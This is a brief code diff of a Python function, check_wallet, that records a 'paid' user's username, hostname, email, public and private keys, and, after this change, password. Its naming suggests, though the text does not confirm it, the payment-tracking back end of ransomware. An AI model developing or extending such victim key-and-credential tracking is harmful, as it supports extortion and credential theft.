@@ -32,11 +32,9 @@ def check_wallet():
 						user.status = True
 						paid_user = UsersPaid(
 							username=user.username,
+							password=user.password,
 							hostname=user.hostname,
 							uid=user.uid,
-							os_name=user.os_name,
-							os_version=user.os_version,
-							os_architecture=user.os_architecture,
 							email=user.email,
 							public_key=user.public_key,
 							private_key=user.private_key,
